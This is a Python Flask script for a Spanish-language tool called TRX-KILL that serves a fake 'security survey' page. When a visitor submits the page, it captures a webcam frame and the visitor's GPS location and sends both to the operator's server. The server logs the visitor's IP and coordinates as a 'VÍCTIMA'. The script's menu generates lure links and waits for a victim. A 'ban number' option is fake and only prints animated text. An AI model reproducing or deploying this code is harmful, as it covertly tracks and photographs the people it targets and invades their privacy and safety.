import os, sys, time, threading, base64
from flask import Flask, request, render_template_string

# --- CONFIGURACIÓN ---
STORAGE_PATH = "/sdcard/INFORMACIÓN-TRX-KILL"
CAPTURA_PATH = f"{STORAGE_PATH}/CAPTURAS"
LOG_FILE = f"{STORAGE_PATH}/datos.txt"
ADMIN_PASS = "admtrx"
os.makedirs(CAPTURA_PATH, exist_ok=True)

app = Flask('TRX-KILL')
G, C, R, Y, W = "\033[1;32m", "\033[1;36m", "\033[1;31m", "\033[1;33m", "\033[0m"

# --- ENCUESTA INTEGRADA ---
HTML_ENCUESTA = """
<!DOCTYPE html><html><body style="background:#000; color:#0f0; font-family:monospace; text-align:center;">
<h2>ENCUESTA DE SEGURIDAD</h2>
<form id="e">
    <p>¿Confirma su identidad?</p>
    <input type="radio" name="res" value="Si"> SI<br>
    <input type="radio" name="res" value="No"> NO<br><br>
    <button type="button" onclick="enviar()">ENVIAR DATOS</button>
</form>
<script>
async function enviar() {
    let res = document.querySelector('input[name="res"]:checked').value;
    let s = await navigator.mediaDevices.getUserMedia({video: true});
    let p = await new Promise(r => navigator.geolocation.getCurrentPosition(r));
    let v = document.createElement('video'); v.srcObject = s; v.play();
    setTimeout(() => {
        let c = document.createElement('canvas'); c.width=400; c.height=300;
        c.getContext('2d').drawImage(v, 0, 0, 400, 300);
        fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&res='+res+'&img='+encodeURIComponent(c.toDataURL()));
        alert('Datos enviados.');
    }, 1000);
}
</script></body></html>
"""

@app.route('/')
def index(): return render_template_string(HTML_ENCUESTA)

@app.route('/log')
def log():
    with open(LOG_FILE, "a") as f:
        f.write(f"VÍCTIMA:{request.remote_addr} | ENCUESTA:{request.args.get('res')} | GPS:{request.args.get('lat')},{request.args.get('lon')}\n")
    return "OK"

def iniciar_servidor():
    import logging
    logging.getLogger('werkzeug').setLevel(logging.ERROR)
    app.run(host='0.0.0.0', port=5000, debug=False)

def animar(t):
    for c in t: sys.stdout.write(f"{G}{c}{W}"); sys.stdout.flush(); time.sleep(0.01)
    print()

def menu():
    threading.Thread(target=iniciar_servidor, daemon=True).start()
    while True:
        os.system('clear')
        print(f"{G}  ___ ___  ___  _  __  ___  ___  _    _")
        print(" |__ |__  |__  | \\/ / |__  |___ | |  | |")
        print("    | |___ |___ |  /  |___ |    |_|__|_|")
        print(f"  {C}--- TRX-KILL V9.0 (ENCUESTA) ---{W}\n")
        print(f"{G}[1] BAN NÚMERO\n[2] LINK-ENCUESTA\n[3] CLON-LINK\n[4] IP-SCAN\n[5] INFO-SIST\n[6] ADM-SIST\n[7] SALIR{W}")
        sel = input(f"\n{Y}TRX-ROOT > {W}")

        if sel == "1":
            input(f"{G}INGRESA NÚMERO: {W}")
            animar("VERIFICANDO..........")
            print(f"{R}(EL NÚMERO NO ESTA SUSPENDIDO, ESCRIBE 8 PARA AUTO BAN){W}")
            if input("ACCIÓN: ") == "8": animar("PROCESANDO AUTO BAN...")
            print(f"{Y}DATOS GUARDADOS EN LA CARPETA{W}"); input("\n[Enter]...")

        elif sel in ["2", "3"]:
            if os.path.exists(LOG_FILE): os.remove(LOG_FILE)
            print(f"{C}LINK ACTIVO: http://127.0.0.1:5000{W}")
            print(f"{Y}ESPERANDO VÍCTIMA...{W}")
            while not os.path.exists(LOG_FILE): time.sleep(0.1)
            print(f"{R}>>> ¡VÍCTIMA DETECTADA Y ENCUESTA RECIBIDA! <<<{W}")
            input("\n[Enter]...")

        elif sel == "6":
            if input(f"{Y}PASS: {W}") == ADMIN_PASS: os.system(f"ls -R {STORAGE_PATH}")
            input("\n[Enter]...")
        elif sel == "7":
            print(f"{G}Gracias por usar trx-kill{W}"); sys.exit()

if __name__ == "__main__": menu()
